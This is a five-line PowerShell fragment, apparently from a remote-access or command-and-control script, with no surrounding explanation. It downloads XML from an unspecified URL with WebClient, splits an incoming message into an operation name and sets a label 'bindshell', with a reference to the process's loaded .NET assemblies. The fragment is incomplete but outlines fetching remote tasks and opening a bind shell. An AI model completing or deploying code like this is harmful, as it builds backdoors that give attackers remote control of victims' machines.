$client = New-Object System.Net.WebClient
[xml] $response = $client.DownloadString($url)
$operation = $message.split('|')[0]
$label = 'bindshell'
$assembly = '[System.AppDomain]::CurrentDomain.GetAssemblies()'
